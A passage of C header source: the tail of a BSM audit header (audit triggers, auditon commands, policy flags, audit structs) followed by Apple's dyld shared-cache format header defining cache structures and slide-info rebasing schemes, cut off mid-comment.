#define MAX_AUDIT_RECORD_SIZE   MAXAUDITDATA
#define MIN_AUDIT_FILE_SIZE     (512 * 1024)

/*
 * Minimum noumber of free blocks on the filesystem containing the audit
 * log necessary to avoid a hard log rotation. DO NOT SET THIS VALUE TO 0
 * as the kernel does an unsigned compare, plus we want to leave a few blocks
 * free so userspace can terminate the log, etc.
 */
#define AUDIT_HARD_LIMIT_FREE_BLOCKS    4

/*
 * Triggers for the audit daemon.
 */
#define AUDIT_TRIGGER_MIN               1
#define AUDIT_TRIGGER_LOW_SPACE         1       /* Below low watermark. */
#define AUDIT_TRIGGER_ROTATE_KERNEL     2       /* Kernel requests rotate. */
#define AUDIT_TRIGGER_READ_FILE         3       /* Re-read config file. */
#define AUDIT_TRIGGER_CLOSE_AND_DIE     4       /* Terminate audit. */
#define AUDIT_TRIGGER_NO_SPACE          5       /* Below min free space. */
#define AUDIT_TRIGGER_ROTATE_USER       6       /* User requests rotate. */
#define AUDIT_TRIGGER_INITIALIZE        7       /* User initialize of auditd. */
#define AUDIT_TRIGGER_EXPIRE_TRAILS     8       /* User expiration of trails. */
#define AUDIT_TRIGGER_MAX               8

/*
 * The special device filename (FreeBSD).
 */
#define AUDITDEV_FILENAME       "audit"
#define AUDIT_TRIGGER_FILE      ("/dev/" AUDITDEV_FILENAME)

/*
 * Pre-defined audit IDs
 */
#define AU_DEFAUDITID   (uid_t)(-1)
#define AU_DEFAUDITSID   0
#define AU_ASSIGN_ASID  -1

/*
 * IPC types.
 */
#define AT_IPC_MSG      ((unsigned char)1)      /* Message IPC id. */
#define AT_IPC_SEM      ((unsigned char)2)      /* Semaphore IPC id. */
#define AT_IPC_SHM      ((unsigned char)3)      /* Shared mem IPC id. */

/*
 * Audit conditions.
 */
#define AUC_UNSET               0
#define AUC_AUDITING            1
#define AUC_NOAUDIT             2
#define AUC_DISABLED            -1

/*
 * auditon(2) commands.
 */
#define A_OLDGETPOLICY  2
#define A_OLDSETPOLICY  3
#define A_GETKMASK      4
#define A_SETKMASK      5
#define A_OLDGETQCTRL   6
#define A_OLDSETQCTRL   7
#define A_GETCWD        8
#define A_GETCAR        9
#define A_GETSTAT       12
#define A_SETSTAT       13
#define A_SETUMASK      14
#define A_SETSMASK      15
#define A_OLDGETCOND    20
#define A_OLDSETCOND    21
#define A_GETCLASS      22
#define A_SETCLASS      23
#define A_GETPINFO      24
#define A_SETPMASK      25
#define A_SETFSIZE      26
#define A_GETFSIZE      27
#define A_GETPINFO_ADDR 28
#define A_GETKAUDIT     29
#define A_SETKAUDIT     30
#define A_SENDTRIGGER   31
#define A_GETSINFO_ADDR 32
#define A_GETPOLICY     33
#define A_SETPOLICY     34
#define A_GETQCTRL      35
#define A_SETQCTRL      36
#define A_GETCOND       37
#define A_SETCOND       38
#define A_GETSFLAGS     39
#define A_SETSFLAGS     40
#define A_GETCTLMODE    41
#define A_SETCTLMODE    42
#define A_GETEXPAFTER   43
#define A_SETEXPAFTER   44

/*
 * Audit policy controls.
 */
#define AUDIT_CNT       0x0001
#define AUDIT_AHLT      0x0002
#define AUDIT_ARGV      0x0004
#define AUDIT_ARGE      0x0008
#define AUDIT_SEQ       0x0010
#define AUDIT_WINDATA   0x0020
#define AUDIT_USER      0x0040
#define AUDIT_GROUP     0x0080
#define AUDIT_TRAIL     0x0100
#define AUDIT_PATH      0x0200
#define AUDIT_SCNT      0x0400
#define AUDIT_PUBLIC    0x0800
#define AUDIT_ZONENAME  0x1000
#define AUDIT_PERZONE   0x2000

/*
 * Default audit queue control parameters.
 */
#define AQ_HIWATER      100
#define AQ_MAXHIGH      10000
#define AQ_LOWATER      10
#define AQ_BUFSZ        MAXAUDITDATA
#define AQ_MAXBUFSZ     1048576

/*
 * Default minimum percentage free space on file system.
 */
#define AU_FS_MINFREE   20

/*
 * Type definitions used indicating the length of variable length addresses
 * in tokens containing addresses, such as header fields.
 */
#define AU_IPv4         4
#define AU_IPv6         16

/*
 * Reserved audit class mask indicating which classes are unable to have
 * events added or removed by unentitled processes.
 */
#define AU_CLASS_MASK_RESERVED 0x10000000

/*
 * Audit control modes
 */
#define AUDIT_CTLMODE_NORMAL ((unsigned char)1)
#define AUDIT_CTLMODE_EXTERNAL ((unsigned char)2)

/*
 * Audit file expire_after op modes
 */
#define AUDIT_EXPIRE_OP_AND ((unsigned char)0)
#define AUDIT_EXPIRE_OP_OR ((unsigned char)1)

__BEGIN_DECLS

typedef uid_t           au_id_t;
typedef pid_t           au_asid_t;
typedef u_int16_t       au_event_t;
typedef u_int16_t       au_emod_t;
typedef u_int32_t       au_class_t;
typedef u_int64_t       au_asflgs_t __attribute__ ((aligned(8)));
typedef unsigned char   au_ctlmode_t;

struct au_tid {
	dev_t           port;
	u_int32_t       machine;
};
typedef struct au_tid   au_tid_t;

struct au_tid_addr {
	dev_t           at_port;
	u_int32_t       at_type;
	u_int32_t       at_addr[4];
};
typedef struct au_tid_addr      au_tid_addr_t;

struct au_mask {
	unsigned int    am_success;     /* Success bits. */
	unsigned int    am_failure;     /* Failure bits. */
};
typedef struct au_mask  au_mask_t;

struct auditinfo {
	au_id_t         ai_auid;        /* Audit user ID. */
	au_mask_t       ai_mask;        /* Audit masks. */
	au_tid_t        ai_termid;      /* Terminal ID. */
	au_asid_t       ai_asid;        /* Audit session ID. */
};
typedef struct auditinfo        auditinfo_t;

struct auditinfo_addr {
	au_id_t         ai_auid;        /* Audit user ID. */
	au_mask_t       ai_mask;        /* Audit masks. */
	au_tid_addr_t   ai_termid;      /* Terminal ID. */
	au_asid_t       ai_asid;        /* Audit session ID. */
	au_asflgs_t     ai_flags;       /* Audit session flags. */
};
typedef struct auditinfo_addr   auditinfo_addr_t;

struct auditpinfo {
	pid_t           ap_pid;         /* ID of target process. */
	au_id_t         ap_auid;        /* Audit user ID. */
	au_mask_t       ap_mask;        /* Audit masks. */
	au_tid_t        ap_termid;      /* Terminal ID. */
	au_asid_t       ap_asid;        /* Audit session ID. */
};
typedef struct auditpinfo       auditpinfo_t;

struct auditpinfo_addr {
	pid_t           ap_pid;         /* ID of target process. */
	au_id_t         ap_auid;        /* Audit user ID. */
	au_mask_t       ap_mask;        /* Audit masks. */
	au_tid_addr_t   ap_termid;      /* Terminal ID. */
	au_asid_t       ap_asid;        /* Audit session ID. */
	au_asflgs_t     ap_flags;       /* Audit session flags. */
};
typedef struct auditpinfo_addr  auditpinfo_addr_t;

struct au_session {
	auditinfo_addr_t        *as_aia_p;      /* Ptr to full audit info. */
	au_mask_t                as_mask;       /* Process Audit Masks. */
};
typedef struct au_session       au_session_t;

struct au_expire_after {
	time_t age;             /* Age after which trail files should be expired */
	size_t size;    /* Aggregate trail size when files should be expired */
	unsigned char op_type; /* Operator used with the above values to determine when files should be expired */
};
typedef struct au_expire_after au_expire_after_t;

/*
 * Contents of token_t are opaque outside of libbsm.
 */
typedef struct au_token token_t;

/*
 * Kernel audit queue control parameters:
 *                      Default:		Maximum:
 *      aq_hiwater:	AQ_HIWATER (100)	AQ_MAXHIGH (10000)
 *      aq_lowater:	AQ_LOWATER (10)		<aq_hiwater
 *      aq_bufsz:	AQ_BUFSZ (32767)	AQ_MAXBUFSZ (1048576)
 *      aq_delay:	20			20000 (not used)
 */
struct au_qctrl {
	int     aq_hiwater;     /* Max # of audit recs in queue when */
	                        /* threads with new ARs get blocked. */

	int     aq_lowater;     /* # of audit recs in queue when */
	                        /* blocked threads get unblocked. */

	int     aq_bufsz;       /* Max size of audit record for audit(2). */
	int     aq_delay;       /* Queue delay (not used). */
	int     aq_minfree;     /* Minimum filesystem percent free space. */
};
typedef struct au_qctrl au_qctrl_t;

/*
 * Structure for the audit statistics.
 */
struct audit_stat {
	unsigned int    as_version;
	unsigned int    as_numevent;
	int             as_generated;
	int             as_nonattrib;
	int             as_kernel;
	int             as_audit;
	int             as_auditctl;
	int             as_enqueue;
	int             as_written;
	int             as_wblocked;
	int             as_rblocked;
	int             as_dropped;
	int             as_totalsize;
	unsigned int    as_memused;
};
typedef struct audit_stat       au_stat_t;

/*
 * Structure for the audit file statistics.
 */
struct audit_fstat {
	u_int64_t       af_filesz;
	u_int64_t       af_currsz;
};
typedef struct audit_fstat      au_fstat_t;

/*
 * Audit to event class mapping.
 */
struct au_evclass_map {
	au_event_t      ec_number;
	au_class_t      ec_class;
};
typedef struct au_evclass_map   au_evclass_map_t;

/*
 * Audit system calls.
 */
#if !defined(_KERNEL) && !defined(KERNEL)
int     audit(const void *, int);
int     auditon(int, void *, int);
int     auditctl(const char *);
int     getauid(au_id_t *);
int     setauid(const au_id_t *);
int     getaudit_addr(struct auditinfo_addr *, int);
int     setaudit_addr(const struct auditinfo_addr *, int);

#if defined(__APPLE__)
#include <Availability.h>

/*
 * getaudit()/setaudit() are deprecated and have been replaced with
 * wrappers to the getaudit_addr()/setaudit_addr() syscalls above.
 */

int     getaudit(struct auditinfo *)
__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_0, __MAC_10_8,
    __IPHONE_2_0, __IPHONE_6_0);
int     setaudit(const struct auditinfo *)
__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_0, __MAC_10_8,
    __IPHONE_2_0, __IPHONE_6_0);
#else

int     getaudit(struct auditinfo *);
int     setaudit(const struct auditinfo *);
#endif /* !__APPLE__ */

#ifdef __APPLE_API_PRIVATE
#include <mach/port.h>
mach_port_name_t audit_session_self(void);
au_asid_t        audit_session_join(mach_port_name_t port);
int              audit_session_port(au_asid_t asid, mach_port_name_t *portname);
#endif /* __APPLE_API_PRIVATE */

#endif /* defined(_KERNEL) || defined(KERNEL) */

__END_DECLS

#endif /* !_BSM_AUDIT_H */

```

`BaseBin/_external/include/dyld_cache_format.h`:

```h
/* -*- mode: C++; c-basic-offset: 4; tab-width: 4 -*- 
 *
 * Copyright (c) 2006-2015 Apple Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_LICENSE_HEADER_END@
 */
#ifndef __DYLD_CACHE_FORMAT__
#define __DYLD_CACHE_FORMAT__

#include <stdint.h>
#include <uuid/uuid.h>

#include "fixup-chains.h"


struct dyld_cache_header
{
    char        magic[16];              // e.g. "dyld_v0    i386"
    uint32_t    mappingOffset;          // file offset to first dyld_cache_mapping_info
    uint32_t    mappingCount;           // number of dyld_cache_mapping_info entries
    uint32_t    imagesOffsetOld;        // UNUSED: moved to imagesOffset to prevent older dsc_extarctors from crashing
    uint32_t    imagesCountOld;         // UNUSED: moved to imagesCount to prevent older dsc_extarctors from crashing
    uint64_t    dyldBaseAddress;        // base address of dyld when cache was built
    uint64_t    codeSignatureOffset;    // file offset of code signature blob
    uint64_t    codeSignatureSize;      // size of code signature blob (zero means to end of file)
    uint64_t    slideInfoOffsetUnused;  // unused.  Used to be file offset of kernel slid info
    uint64_t    slideInfoSizeUnused;    // unused.  Used to be size of kernel slid info
    uint64_t    localSymbolsOffset;     // file offset of where local symbols are stored
    uint64_t    localSymbolsSize;       // size of local symbols information
    uint8_t     uuid[16];               // unique value for each shared cache file
    uint64_t    cacheType;              // 0 for development, 1 for production, 2 for multi-cache
    uint32_t    branchPoolsOffset;      // file offset to table of uint64_t pool addresses
    uint32_t    branchPoolsCount;       // number of uint64_t entries
    uint64_t    dyldInCacheMH;          // (unslid) address of mach_header of dyld in cache
    uint64_t    dyldInCacheEntry;       // (unslid) address of entry point (_dyld_start) of dyld in cache
    uint64_t    imagesTextOffset;       // file offset to first dyld_cache_image_text_info
    uint64_t    imagesTextCount;        // number of dyld_cache_image_text_info entries
    uint64_t    patchInfoAddr;          // (unslid) address of dyld_cache_patch_info
    uint64_t    patchInfoSize;          // Size of all of the patch information pointed to via the dyld_cache_patch_info
    uint64_t    otherImageGroupAddrUnused;    // unused
    uint64_t    otherImageGroupSizeUnused;    // unused
    uint64_t    progClosuresAddr;       // (unslid) address of list of program launch closures
    uint64_t    progClosuresSize;       // size of list of program launch closures
    uint64_t    progClosuresTrieAddr;   // (unslid) address of trie of indexes into program launch closures
    uint64_t    progClosuresTrieSize;   // size of trie of indexes into program launch closures
    uint32_t    platform;               // platform number (macOS=1, etc)
    uint32_t    formatVersion          : 8,  // dyld3::closure::kFormatVersion
                dylibsExpectedOnDisk   : 1,  // dyld should expect the dylib exists on disk and to compare inode/mtime to see if cache is valid
                simulator              : 1,  // for simulator of specified platform
                locallyBuiltCache      : 1,  // 0 for B&I built cache, 1 for locally built cache
                builtFromChainedFixups : 1,  // some dylib in cache was built using chained fixups, so patch tables must be used for overrides
                padding                : 20; // TBD
    uint64_t    sharedRegionStart;      // base load address of cache if not slid
    uint64_t    sharedRegionSize;       // overall size required to map the cache and all subCaches, if any
    uint64_t    maxSlide;               // runtime slide of cache can be between zero and this value
    uint64_t    dylibsImageArrayAddr;   // (unslid) address of ImageArray for dylibs in this cache
    uint64_t    dylibsImageArraySize;   // size of ImageArray for dylibs in this cache
    uint64_t    dylibsTrieAddr;         // (unslid) address of trie of indexes of all cached dylibs
    uint64_t    dylibsTrieSize;         // size of trie of cached dylib paths
    uint64_t    otherImageArrayAddr;    // (unslid) address of ImageArray for dylibs and bundles with dlopen closures
    uint64_t    otherImageArraySize;    // size of ImageArray for dylibs and bundles with dlopen closures
    uint64_t    otherTrieAddr;          // (unslid) address of trie of indexes of all dylibs and bundles with dlopen closures
    uint64_t    otherTrieSize;          // size of trie of dylibs and bundles with dlopen closures
    uint32_t    mappingWithSlideOffset; // file offset to first dyld_cache_mapping_and_slide_info
    uint32_t    mappingWithSlideCount;  // number of dyld_cache_mapping_and_slide_info entries
    uint64_t    dylibsPBLStateArrayAddrUnused;    // unused
    uint64_t    dylibsPBLSetAddr;           // (unslid) address of PrebuiltLoaderSet of all cached dylibs
    uint64_t    programsPBLSetPoolAddr;     // (unslid) address of pool of PrebuiltLoaderSet for each program 
    uint64_t    programsPBLSetPoolSize;     // size of pool of PrebuiltLoaderSet for each program
    uint64_t    programTrieAddr;            // (unslid) address of trie mapping program path to PrebuiltLoaderSet
    uint32_t    programTrieSize;
    uint32_t    osVersion;                  // OS Version of dylibs in this cache for the main platform
    uint32_t    altPlatform;                // e.g. iOSMac on macOS
    uint32_t    altOsVersion;               // e.g. 14.0 for iOSMac
    uint64_t    swiftOptsOffset;        // VM offset from cache_header* to Swift optimizations header
    uint64_t    swiftOptsSize;          // size of Swift optimizations header
    uint32_t    subCacheArrayOffset;    // file offset to first dyld_subcache_entry
    uint32_t    subCacheArrayCount;     // number of subCache entries
    uint8_t     symbolFileUUID[16];     // unique value for the shared cache file containing unmapped local symbols
    uint64_t    rosettaReadOnlyAddr;    // (unslid) address of the start of where Rosetta can add read-only/executable data
    uint64_t    rosettaReadOnlySize;    // maximum size of the Rosetta read-only/executable region
    uint64_t    rosettaReadWriteAddr;   // (unslid) address of the start of where Rosetta can add read-write data
    uint64_t    rosettaReadWriteSize;   // maximum size of the Rosetta read-write region
    uint32_t    imagesOffset;           // file offset to first dyld_cache_image_info
    uint32_t    imagesCount;            // number of dyld_cache_image_info entries
    uint32_t    cacheSubType;           // 0 for development, 1 for production, when cacheType is multi-cache(2)
    uint64_t    objcOptsOffset;         // VM offset from cache_header* to ObjC optimizations header
    uint64_t    objcOptsSize;           // size of ObjC optimizations header
    uint64_t    cacheAtlasOffset;       // VM offset from cache_header* to embedded cache atlas for process introspection
    uint64_t    cacheAtlasSize;         // size of embedded cache atlas
    uint64_t    dynamicDataOffset;      // VM offset from cache_header* to the location of dyld_cache_dynamic_data_header
    uint64_t    dynamicDataMaxSize;     // maximum size of space reserved from dynamic data
};

// Uncomment this and check the build errors for the current mapping offset to check against when adding new fields.
// template<size_t size> class A { int x[-size]; }; A<sizeof(dyld_cache_header)> a;


struct dyld_cache_mapping_info {
    uint64_t    address;
    uint64_t    size;
    uint64_t    fileOffset;
    uint32_t    maxProt;
    uint32_t    initProt;
};

// Contains the flags for the dyld_cache_mapping_and_slide_info flgs field
enum {
    DYLD_CACHE_MAPPING_AUTH_DATA            = 1 << 0U,
    DYLD_CACHE_MAPPING_DIRTY_DATA           = 1 << 1U,
    DYLD_CACHE_MAPPING_CONST_DATA           = 1 << 2U,
    DYLD_CACHE_MAPPING_TEXT_STUBS           = 1 << 3U,
    DYLD_CACHE_DYNAMIC_CONFIG_DATA          = 1 << 4U,
};

struct dyld_cache_mapping_and_slide_info {
    uint64_t    address;
    uint64_t    size;
    uint64_t    fileOffset;
    uint64_t    slideInfoFileOffset;
    uint64_t    slideInfoFileSize;
    uint64_t    flags;
    uint32_t    maxProt;
    uint32_t    initProt;
};

struct dyld_cache_image_info
{
    uint64_t    address;
    uint64_t    modTime;
    uint64_t    inode;
    uint32_t    pathFileOffset;
    uint32_t    pad;
};

struct dyld_cache_image_info_extra
{
    uint64_t    exportsTrieAddr;        // address of trie in unslid cache
    uint64_t    weakBindingsAddr;
    uint32_t    exportsTrieSize;
    uint32_t    weakBindingsSize;
    uint32_t    dependentsStartArrayIndex;
    uint32_t    reExportsStartArrayIndex;
};


struct dyld_cache_accelerator_info
{
    uint32_t    version;                // currently 1
    uint32_t    imageExtrasCount;       // does not include aliases
    uint32_t    imagesExtrasOffset;     // offset into this chunk of first dyld_cache_image_info_extra
    uint32_t    bottomUpListOffset;     // offset into this chunk to start of 16-bit array of sorted image indexes
    uint32_t    dylibTrieOffset;        // offset into this chunk to start of trie containing all dylib paths
    uint32_t    dylibTrieSize;          // size of trie containing all dylib paths
    uint32_t    initializersOffset;     // offset into this chunk to start of initializers list
    uint32_t    initializersCount;      // size of initializers list
    uint32_t    dofSectionsOffset;      // offset into this chunk to start of DOF sections list
    uint32_t    dofSectionsCount;       // size of initializers list
    uint32_t    reExportListOffset;     // offset into this chunk to start of 16-bit array of re-exports
    uint32_t    reExportCount;          // size of re-exports
    uint32_t    depListOffset;          // offset into this chunk to start of 16-bit array of dependencies (0x8000 bit set if upward)
    uint32_t    depListCount;           // size of dependencies
    uint32_t    rangeTableOffset;       // offset into this chunk to start of ss
    uint32_t    rangeTableCount;        // size of dependencies
    uint64_t    dyldSectionAddr;        // address of libdyld's __dyld section in unslid cache
};

struct dyld_cache_accelerator_initializer
{
    uint32_t    functionOffset;         // address offset from start of cache mapping
    uint32_t    imageIndex;
};

struct dyld_cache_range_entry
{
    uint64_t    startAddress;           // unslid address of start of region
    uint32_t    size;
    uint32_t    imageIndex;
};

struct dyld_cache_accelerator_dof
{
    uint64_t    sectionAddress;         // unslid address of start of region
    uint32_t    sectionSize;
    uint32_t    imageIndex;
};

struct dyld_cache_image_text_info
{
    uuid_t      uuid;
    uint64_t    loadAddress;            // unslid address of start of __TEXT
    uint32_t    textSegmentSize;
    uint32_t    pathOffset;             // offset from start of cache file
};


// The rebasing info is to allow the kernel to lazily rebase DATA pages of the
// dyld shared cache.  Rebasing is adding the slide to interior pointers.
struct dyld_cache_slide_info
{
    uint32_t    version;        // currently 1
    uint32_t    toc_offset;
    uint32_t    toc_count;
    uint32_t    entries_offset;
    uint32_t    entries_count;
    uint32_t    entries_size;  // currently 128 
    // uint16_t toc[toc_count];
    // entrybitmap entries[entries_count];
};

struct dyld_cache_slide_info_entry {
    uint8_t  bits[4096/(8*4)]; // 128-byte bitmap
};


// The version 2 of the slide info uses a different compression scheme. Since
// only interior pointers (pointers that point within the cache) are rebased
// (slid), we know the possible range of the pointers and thus know there are
// unused bits in each pointer.  We use those bits to form a linked list of
// locations needing rebasing in each page.
//
// Definitions:
//
//  pageIndex = (pageAddress - startOfAllDataAddress)/info->page_size
//  pageStarts[] = info + info->page_starts_offset
//  pageExtras[] = info + info->page_extras_offset
//  valueMask = ~(info->delta_mask)
//  deltaShift = __builtin_ctzll(info->delta_mask) - 2
//
// There are three cases:
//
// 1) pageStarts[pageIndex] == DYLD_CACHE_SLIDE_PAGE_ATTR_NO_REBASE
//    The page contains no values that need rebasing.
//
// 2) (pageStarts[pageIndex] & DYLD_CACHE_SLIDE_PAGE_ATTR_EXTRA) == 0
//    All rebase locations are in one linked list. The offset of the first
//    rebase location in the page is pageStarts[pageIndex] * 4.
//
// 3) pageStarts[pageIndex] & DYLD_CACHE_SLIDE_PAGE_ATTR_EXTRA
//      Multiple linked lists are needed for all rebase locations in a page.
//    The pagesExtras array contains 2 or more entries each of which is the
//    start of a new linked list in the page. The first is at:
//       extrasStartIndex = (pageStarts[pageIndex] & 0x3FFF)
//      The next is at extrasStartIndex+1.  The last is denoted by
//    having the high bit (DYLD_CACHE_SLIDE_PAGE_ATTR_END) of the pageExtras[]
//    set.
//
// For 64-bit architectures, there is always enough free bits to encode all
// possible deltas.  The info->delta_mask field shows where the delta is located
// in the pointer.  That value must be masked off (valueMask) before the slide
// is added to the pointer.
//
// For 32-bit architectures, there are only three bits free (the three most
// significant bits). To extract the delta, you must first subtract value_add
// from the pointer value, then AND with delta_mask, then shift by deltaShift.
// That still leaves a maximum delta to the next rebase location of 28 bytes.
// To reduce the number or chains needed, an optimization was added.  Turns
// out zero is common in the DATA region.  A zero can be turned into a
// non-rebasing entry in the linked list.  The can be done because nothing
// in the shared cache should point out of its dylib to the start of the shared
// cache.
//
// The code for processing a linked list (chain) is:
//   
//    uint32_t delta = 1;
//    while ( delta != 0 ) {
//        uint8_t* loc = pageStart + pageOffset;
//        uintptr_t rawValue = *((uintptr_t*)loc);
//        delta = ((rawValue & deltaMask) >> deltaShift);
//        uintptr_t newValue = (rawValue & valueMask);
//        if ( newValue != 0 ) {
//            newValue += valueAdd;
//            newValue += slideAmount;
//        }
//        *((uintptr_t*)loc) = newValue;
//        pageOffset += delta;
//    }
//
//
struct dyld_cache_slide_info2
{
    uint32_t    version;            // currently 2
    uint32_t    page_size;          // currently 4096 (may also be 16384)
    uint32_t    page_starts_offset;
    uint32_t    page_starts_count;
    uint32_t    page_extras_offset;
    uint32_t    page_extras_count;
    uint64_t    delta_mask;         // which (contiguous) set of bits contains the delta to the next rebase location
    uint64_t    value_add;
    //uint16_t    page_starts[page_starts_count];
    //uint16_t    page_extras[page_extras_count];
};
#define DYLD_CACHE_SLIDE_PAGE_ATTRS                0xC000  // high bits of uint16_t are flags
#define DYLD_CACHE_SLIDE_PAGE_ATTR_EXTRA           0x8000  // index is into extras array (not starts array)
#define DYLD_CACHE_SLIDE_PAGE_ATTR_NO_REBASE       0x4000  // page has no rebasing
#define DYLD_CACHE_SLIDE_PAGE_ATTR_END             0x8000  // last chain entry for page



// The version 3 of the slide info uses a different compression scheme. Since
// only interior pointers (pointers that point within the cache) are rebased
// (slid), we know the possible range of the pointers and thus know there are
// unused bits in each pointer.  We use those bits to form a linked list of
// locations needing rebasing in each page.
//
// Definitions:
//
//  pageIndex = (pageAddress - startOfAllDataAddress)/info->page_size
//  pageStarts[] = info + info->page_starts_offset
//
// There are two cases:
//
// 1) pageStarts[pageIndex] == DYLD_CACHE_SLIDE_V3_PAGE_ATTR_NO_REBASE
//    The page contains no values that need rebasing.
//
// 2) otherwise...
//    All rebase locations are in one linked list. The offset of the first
//    rebase location in the page is pageStarts[pageIndex].
//
// A pointer is one of of the variants in dyld_cache_slide_pointer3
//
// The code for processing a linked list (chain) is:
//
//    uint32_t delta = pageStarts[pageIndex];
//    dyld_cache_slide_pointer3* loc = pageStart;
//    do {
//        loc += delta;
//        delta = loc->offsetToNextPointer;
//        if ( loc->auth.authenticated ) {
//            newValue = loc->offsetFromSharedCacheBase  + results->slide + auth_value_add;
//            newValue = sign_using_the_various_bits(newValue);
//        }
//        else {
//            uint64_t value51      = loc->pointerValue;
//            uint64_t top8Bits     = value51 & 0x0007F80000000000ULL;
//            uint64_t bottom43Bits = value51 & 0x000007FFFFFFFFFFULL;
//            uint64_t targetValue  = ( top8Bits << 13 ) | bottom43Bits;
//            newValue = targetValue + results->slide;
//        }
//        loc->raw = newValue;
//    } while (delta != 0);
//
//
struct dyld_cache_slide_info3
{
    uint32_t    version;            // currently 3
    uint32_t    page_size;          // currently 4096 (may also be 16384)
    uint32_t    page_starts_count;
    uint64_t    auth_value_add;
    uint16_t    page_starts[/* page_starts_count */];
};

#define DYLD_CACHE_SLIDE_V3_PAGE_ATTR_NO_REBASE    0xFFFF    // page has no rebasing

union dyld_cache_slide_pointer3
{
    uint64_t  raw;
    struct {
        uint64_t    pointerValue        : 51,
                    offsetToNextPointer : 11,
                    unused              :  2;
    }         plain;

    struct {
        uint64_t    offsetFromSharedCacheBase : 32,
                    diversityData             : 16,
                    hasAddressDiversity       :  1,
                    key                       :  2,
                    offsetToNextPointer       : 11,
                    unused                    :  1,
                    authenticated             :  1; // = 1;
    }         auth;
};



// The version 4 of the slide info is optimized for 32-bit caches up to 1GB.
// Since only interior pointers (pointers that point within the cache) are rebased
// (slid), we know the possible range of the pointers takes 30 bits.  That
// gives us two bits to use to chain to the next rebase.
//
// Definitions:
//
//  pageIndex = (pageAddress - startOfAllDataAddress)/info->page_size
//  pageStarts[] = info + info->page_starts_offset
//  pageExtras[] = info + info->page_extras_offset
//  valueMask = ~(info->delta_mask)
//  deltaShift = __builtin_ctzll(info->delta_mask) - 2
//
// There are three cases:
//
// 1) pageStarts[pageIndex] == DYLD_CACHE_SLIDE4_PAGE_NO_REBASE
//    The page contains no values that need rebasing.
//
// 2) (pageStarts[pageIndex] & DYLD_CACHE_SLIDE4_PAGE_USE_EXTRA) == 0
//    All rebase locations are in one linked list. The offset of the first
//    rebase location in the page is pageStarts[pageIndex] * 4.
//
// 3) pageStarts[pageIndex] & DYLD_CACHE_SLIDE4_PAGE_USE_EXTRA
//    Multiple chains are needed for all rebase locations in a page.
//    The pagesExtras array contains 2 or more entries each of which is the
//    start of a new chain in the page. The first is at:
//       extrasStartIndex = (pageStarts[pageIndex] & DYLD_CACHE_SLIDE4_PAGE_INDEX)
//    The next is at extrasStartIndex+1.  The last is denoted by
//    having the high bit (DYLD_CACHE_SLIDE4_PAGE_EXTRA_END) of the pageExtras[].
//
// For 32-bit architectures, there are only two bits free (the two most
// significant bits). To extract the delta, you must first subtract value_add
// from the pointer value, then AND with delta_mask, then shift by deltaShift.
// That still leaves a maximum delta to the next rebase location of 12 bytes.
// To reduce the number or chains needed, an optimization was added.  Turns
// most of the non-rebased data are small values and can be co-opt'ed into
// being used in the chain. The can be done because nothing
// in the shared cache should point to the first 64KB which are in the shared
// cache header information. So if the resulting pointer points to the
// start of the cache +/-32KB, then it is actually a small number that should
// not be rebased, but just reconstituted.
//
// The code for processing a linked list (chain) is:
//
//    uint32_t delta = 1;
//    while ( delta != 0 ) {
//        uint8_t* loc = pageStart + pageOffset;
//        uint32_t rawValue = *((uint32_t*)loc);
//        delta = ((rawValue & deltaMask) >> deltaShift);
//        uintptr_t newValue = (rawValue & valueMask);
//        if ( (newValue & 0xFFFF8000) == 0 ) {
//           // small positive non-pointer, use as-is
//        }
//        else if ( (newValue & 0x3FFF8000) == 0x3FFF8000 ) {
//           // small negative non-pointer
//           newValue |= 0xC0000000;
//        }
//        else  {
//            // pointer that needs rebasing
//            newValue += valueAdd;
//            newValue += slideAmount;
//        }
//        *((uint32_t*)loc) = newValue;
//        pageOffset += delta;
//    }
//
//
struct dyld_cache_slide_info4
{
    uint32_t    version;            // currently 4
    uint32_t    page_size;          // currently 4096 (may also be 16384)
    uint32_t    page_starts_offset;
    uint32_t    page_starts_count;
    uint32_t    page_extras_offset;
    uint32_t    page_extras_count;
    uint64_t    delta_mask;         // which (contiguous) set of bits contains the delta to the next rebase location (0xC0000000)
    uint64_t    value_add;          // base address of cache
    //uint16_t    page_starts[page_starts_count];
    //uint16_t    page_extras[page_extras_count];
};
#define DYLD_CACHE_SLIDE4_PAGE_NO_REBASE           0xFFFF  // page has no rebasing
#define DYLD_CACHE_SLIDE4_PAGE_INDEX               0x7FFF  // mask of page_starts[] values
#define DYLD_CACHE_SLIDE4_PAGE_USE_EXTRA           0x8000  // index is into extras array (not a chain start offset)
#define DYLD_CACHE_SLIDE4_PAGE_EXTRA_END           0x8000  // last chain entry for page


// The version 5 of the slide info uses a different compression scheme. Since
// only interior pointers (pointers that point within the cache) are rebased
// (slid), we know the possible range of the pointers and thus know there are
// unused bits in each pointer.  We use those bits to form a linked list of
// locations needing rebasing in each page.
//
// Definitions:
//
//  pageIndex = (pageAddress - startOfAllDataAddress)/info->page_size
//  pageStarts[] = info + info->page_starts_offset
//
// There are two cases:
//
// 1) pageStarts[pageIndex] == DYLD_CACHE_SLIDE_V5_PAGE_ATTR_NO_REBASE
//    The page contains no values that need rebasing.
//
// 2) otherwise...
//    All rebase locations are in one linked list. The offset of the first
//    rebase location in the page is pageStarts[pageIndex].
//
// A pointer is one of of the variants in dyld_cache_slide_pointer5
//
// The code for processing a linked list (chain) is:
//
//    uint32_t delta = pageStarts[pageIndex];
//    dyld_cache_slide_pointer5* loc = pageStart;
//    do {
//        loc += delta;
//        delta = loc->offsetToNextPointer;
//        newValue = loc->regular.target + value_add + results->slide;
//        if ( loc->auth.authenticated ) {
//            newValue = sign_using_the_various_bits(newValue);
//        }
//        else {
//            newValue = newValue | (loc->regular.high8 < 56);
//        }
